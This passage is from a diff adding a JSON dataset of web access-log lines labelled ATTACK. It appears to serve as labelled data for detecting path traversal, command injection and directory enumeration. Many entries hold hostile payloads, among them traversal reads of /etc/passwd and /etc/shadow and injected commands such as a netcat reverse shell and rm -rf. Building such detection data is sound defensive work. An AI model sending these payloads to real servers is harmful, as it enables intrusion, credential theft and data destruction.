+    "raw": "194.26.29.15 - - [01/Jun/2026:10:40:00 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.16 - - [01/Jun/2026:10:40:05 +0000] \"GET /include?page=../../../../etc/shadow HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.17 - - [01/Jun/2026:10:40:10 +0000] \"GET /read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.18 - - [01/Jun/2026:10:40:15 +0000] \"GET /view?path=../../../../boot.ini HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.19 - - [01/Jun/2026:10:40:20 +0000] \"GET /download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.20 - - [01/Jun/2026:10:40:25 +0000] \"GET /static/files/../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.21 - - [01/Jun/2026:10:40:30 +0000] \"GET /get_doc?file=../../../../../../var/log/syslog HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.22 - - [01/Jun/2026:10:40:35 +0000] \"GET /load?template=../../conf/server.xml HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.23 - - [01/Jun/2026:10:40:40 +0000] \"GET /view_file?f=c:\\windows\\system32\\cmd.exe HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.24 - - [01/Jun/2026:10:40:45 +0000] \"GET /assets/images/../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.15 - - [01/Jun/2026:10:40:50 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.16 - - [01/Jun/2026:10:40:55 +0000] \"GET /include?page=../../../../etc/shadow HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.17 - - [01/Jun/2026:10:41:00 +0000] \"GET /read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.18 - - [01/Jun/2026:10:41:05 +0000] \"GET /view?path=../../../../boot.ini HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.19 - - [01/Jun/2026:10:41:10 +0000] \"GET /download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.20 - - [01/Jun/2026:10:41:15 +0000] \"GET /static/files/../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.21 - - [01/Jun/2026:10:41:20 +0000] \"GET /get_doc?file=../../../../../../var/log/syslog HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.22 - - [01/Jun/2026:10:41:25 +0000] \"GET /load?template=../../conf/server.xml HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.23 - - [01/Jun/2026:10:41:30 +0000] \"GET /view_file?f=c:\\windows\\system32\\cmd.exe HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.24 - - [01/Jun/2026:10:41:35 +0000] \"GET /assets/images/../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.15 - - [01/Jun/2026:10:41:40 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.16 - - [01/Jun/2026:10:41:45 +0000] \"GET /include?page=../../../../etc/shadow HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.17 - - [01/Jun/2026:10:41:50 +0000] \"GET /read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.18 - - [01/Jun/2026:10:41:55 +0000] \"GET /view?path=../../../../boot.ini HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.19 - - [01/Jun/2026:10:42:00 +0000] \"GET /download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.20 - - [01/Jun/2026:10:42:05 +0000] \"GET /static/files/../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.21 - - [01/Jun/2026:10:42:10 +0000] \"GET /get_doc?file=../../../../../../var/log/syslog HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.22 - - [01/Jun/2026:10:42:15 +0000] \"GET /load?template=../../conf/server.xml HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.23 - - [01/Jun/2026:10:42:20 +0000] \"GET /view_file?f=c:\\windows\\system32\\cmd.exe HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.24 - - [01/Jun/2026:10:42:25 +0000] \"GET /assets/images/../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.15 - - [01/Jun/2026:10:42:30 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.16 - - [01/Jun/2026:10:42:35 +0000] \"GET /include?page=../../../../etc/shadow HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.17 - - [01/Jun/2026:10:42:40 +0000] \"GET /read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.18 - - [01/Jun/2026:10:42:45 +0000] \"GET /view?path=../../../../boot.ini HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.19 - - [01/Jun/2026:10:42:50 +0000] \"GET /download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.20 - - [01/Jun/2026:10:42:55 +0000] \"GET /static/files/../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.21 - - [01/Jun/2026:10:43:00 +0000] \"GET /get_doc?file=../../../../../../var/log/syslog HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.22 - - [01/Jun/2026:10:43:05 +0000] \"GET /load?template=../../conf/server.xml HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.23 - - [01/Jun/2026:10:43:10 +0000] \"GET /view_file?f=c:\\windows\\system32\\cmd.exe HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.24 - - [01/Jun/2026:10:43:15 +0000] \"GET /assets/images/../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.15 - - [01/Jun/2026:10:43:20 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.16 - - [01/Jun/2026:10:43:25 +0000] \"GET /include?page=../../../../etc/shadow HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.17 - - [01/Jun/2026:10:43:30 +0000] \"GET /read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.18 - - [01/Jun/2026:10:43:35 +0000] \"GET /view?path=../../../../boot.ini HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.19 - - [01/Jun/2026:10:43:40 +0000] \"GET /download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.20 - - [01/Jun/2026:10:43:45 +0000] \"GET /static/files/../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.21 - - [01/Jun/2026:10:43:50 +0000] \"GET /get_doc?file=../../../../../../var/log/syslog HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.22 - - [01/Jun/2026:10:43:55 +0000] \"GET /load?template=../../conf/server.xml HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.23 - - [01/Jun/2026:10:44:00 +0000] \"GET /view_file?f=c:\\windows\\system32\\cmd.exe HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "194.26.29.24 - - [01/Jun/2026:10:44:05 +0000] \"GET /assets/images/../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"curl/7.68.0\"",
+    "label": "ATTACK",
+    "category": "path_traversal"
+  },
+  {
+    "raw": "91.240.118.20 - - [01/Jun/2026:10:50:00 +0000] \"GET /tools/ping?target=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.21 - - [01/Jun/2026:10:50:05 +0000] \"GET /tools/lookup?host=google.com%7Cls%20-la HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.22 - - [01/Jun/2026:10:50:10 +0000] \"GET /status?node=main%3B%20id HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.23 - - [01/Jun/2026:10:50:15 +0000] \"GET /backup?action=run%20&&%20whoami HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.24 - - [01/Jun/2026:10:50:20 +0000] \"GET /api/export?format=csv%3B%20uname%20-a HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.25 - - [01/Jun/2026:10:50:25 +0000] \"GET /exec?cmd=cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.26 - - [01/Jun/2026:10:50:30 +0000] \"GET /check?ip=8.8.8.8%3B%20sleep%205 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.27 - - [01/Jun/2026:10:50:35 +0000] \"GET /admin/diag?ip=10.0.0.1%20%7C%20netstat%20-an HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.28 - - [01/Jun/2026:10:50:40 +0000] \"GET /test?host=127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.29 - - [01/Jun/2026:10:50:45 +0000] \"GET /service/restart?svc=nginx%3B%20rm%20-rf%20/tmp/data HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.20 - - [01/Jun/2026:10:50:50 +0000] \"GET /tools/ping?target=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.21 - - [01/Jun/2026:10:50:55 +0000] \"GET /tools/lookup?host=google.com%7Cls%20-la HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.22 - - [01/Jun/2026:10:51:00 +0000] \"GET /status?node=main%3B%20id HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.23 - - [01/Jun/2026:10:51:05 +0000] \"GET /backup?action=run%20&&%20whoami HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.24 - - [01/Jun/2026:10:51:10 +0000] \"GET /api/export?format=csv%3B%20uname%20-a HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.25 - - [01/Jun/2026:10:51:15 +0000] \"GET /exec?cmd=cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.26 - - [01/Jun/2026:10:51:20 +0000] \"GET /check?ip=8.8.8.8%3B%20sleep%205 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.27 - - [01/Jun/2026:10:51:25 +0000] \"GET /admin/diag?ip=10.0.0.1%20%7C%20netstat%20-an HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.28 - - [01/Jun/2026:10:51:30 +0000] \"GET /test?host=127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.29 - - [01/Jun/2026:10:51:35 +0000] \"GET /service/restart?svc=nginx%3B%20rm%20-rf%20/tmp/data HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.20 - - [01/Jun/2026:10:51:40 +0000] \"GET /tools/ping?target=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.21 - - [01/Jun/2026:10:51:45 +0000] \"GET /tools/lookup?host=google.com%7Cls%20-la HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.22 - - [01/Jun/2026:10:51:50 +0000] \"GET /status?node=main%3B%20id HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.23 - - [01/Jun/2026:10:51:55 +0000] \"GET /backup?action=run%20&&%20whoami HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.24 - - [01/Jun/2026:10:52:00 +0000] \"GET /api/export?format=csv%3B%20uname%20-a HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.25 - - [01/Jun/2026:10:52:05 +0000] \"GET /exec?cmd=cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.26 - - [01/Jun/2026:10:52:10 +0000] \"GET /check?ip=8.8.8.8%3B%20sleep%205 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.27 - - [01/Jun/2026:10:52:15 +0000] \"GET /admin/diag?ip=10.0.0.1%20%7C%20netstat%20-an HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.28 - - [01/Jun/2026:10:52:20 +0000] \"GET /test?host=127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.29 - - [01/Jun/2026:10:52:25 +0000] \"GET /service/restart?svc=nginx%3B%20rm%20-rf%20/tmp/data HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.20 - - [01/Jun/2026:10:52:30 +0000] \"GET /tools/ping?target=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.21 - - [01/Jun/2026:10:52:35 +0000] \"GET /tools/lookup?host=google.com%7Cls%20-la HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.22 - - [01/Jun/2026:10:52:40 +0000] \"GET /status?node=main%3B%20id HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.23 - - [01/Jun/2026:10:52:45 +0000] \"GET /backup?action=run%20&&%20whoami HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.24 - - [01/Jun/2026:10:52:50 +0000] \"GET /api/export?format=csv%3B%20uname%20-a HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.25 - - [01/Jun/2026:10:52:55 +0000] \"GET /exec?cmd=cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.26 - - [01/Jun/2026:10:53:00 +0000] \"GET /check?ip=8.8.8.8%3B%20sleep%205 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.27 - - [01/Jun/2026:10:53:05 +0000] \"GET /admin/diag?ip=10.0.0.1%20%7C%20netstat%20-an HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.28 - - [01/Jun/2026:10:53:10 +0000] \"GET /test?host=127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.29 - - [01/Jun/2026:10:53:15 +0000] \"GET /service/restart?svc=nginx%3B%20rm%20-rf%20/tmp/data HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.20 - - [01/Jun/2026:10:53:20 +0000] \"GET /tools/ping?target=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.21 - - [01/Jun/2026:10:53:25 +0000] \"GET /tools/lookup?host=google.com%7Cls%20-la HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.22 - - [01/Jun/2026:10:53:30 +0000] \"GET /status?node=main%3B%20id HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.23 - - [01/Jun/2026:10:53:35 +0000] \"GET /backup?action=run%20&&%20whoami HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.24 - - [01/Jun/2026:10:53:40 +0000] \"GET /api/export?format=csv%3B%20uname%20-a HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.25 - - [01/Jun/2026:10:53:45 +0000] \"GET /exec?cmd=cat%20/etc/passwd HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.26 - - [01/Jun/2026:10:53:50 +0000] \"GET /check?ip=8.8.8.8%3B%20sleep%205 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.27 - - [01/Jun/2026:10:53:55 +0000] \"GET /admin/diag?ip=10.0.0.1%20%7C%20netstat%20-an HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.28 - - [01/Jun/2026:10:54:00 +0000] \"GET /test?host=127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "91.240.118.29 - - [01/Jun/2026:10:54:05 +0000] \"GET /service/restart?svc=nginx%3B%20rm%20-rf%20/tmp/data HTTP/1.1\" 500 512 \"-\" \"python-requests/2.28\"",
+    "label": "ATTACK",
+    "category": "cmd_injection"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:00 +0000] \"GET /.git/config HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:02 +0000] \"GET /.env HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:04 +0000] \"GET /.htaccess HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:06 +0000] \"GET /admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:08 +0000] \"GET /wp-admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:10 +0000] \"GET /backup.zip HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:12 +0000] \"GET /phpmyadmin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:14 +0000] \"GET /config.php.bak HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:16 +0000] \"GET /server-status HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:18 +0000] \"GET /database.sql HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:20 +0000] \"GET /.git/config HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:22 +0000] \"GET /.env HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:24 +0000] \"GET /.htaccess HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:26 +0000] \"GET /admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:28 +0000] \"GET /wp-admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
